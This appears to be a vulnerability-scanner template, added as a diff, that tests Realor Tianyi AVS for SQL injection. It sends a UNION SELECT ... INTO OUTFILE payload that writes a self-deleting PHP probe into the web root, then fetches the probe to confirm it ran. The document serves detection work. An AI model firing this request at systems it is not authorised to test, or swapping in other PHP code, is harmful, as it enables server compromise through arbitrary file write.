@@ -1,0 +1,53 @@
+id: realor-tianyi-sql-injection
+info:
+  name: Realor Tianyi AVS SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Realor Tianyi Application Virtualization System is vulnerable to an SQL injection vulnerability, allowing attackers to execute arbitrary commands on the server side.
+  tags: sql-injection
+  classification:
+    cvss-score: 9.2
+  metadata:
+    product: REALOR-Tianyi-AVS
+    cve-id: CVD-2023-2573
+
+variables:
+  php_code: "<?php echo(md5(\"test\"));unlink(__FILE__);?>"
+  filename: "test.xgi"
+  md5_hash: "098f6bcd4621d373cade4e832627b4f6" # md5 hash of 'test'
+
+http:
+  - raw:
+      - |
+        POST /ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept-Encoding: gzip
+        Connection: close
+        Cookie: PHPSESSID=t50ep2hj6cj7cvoitlrp7noop7; CookieLanguageName=ZH-CN; think_language=zh-CN; UserAuthtype=0
+        Content-Length: 588
+
+        {
+          "account": "1' union select '{{php_code}}',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL into outfile '..\\\\..\\\\WebRoot\\\\{{filename}}'#",
+          "userPwd": "1"
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{md5_hash}}"
+        part: body
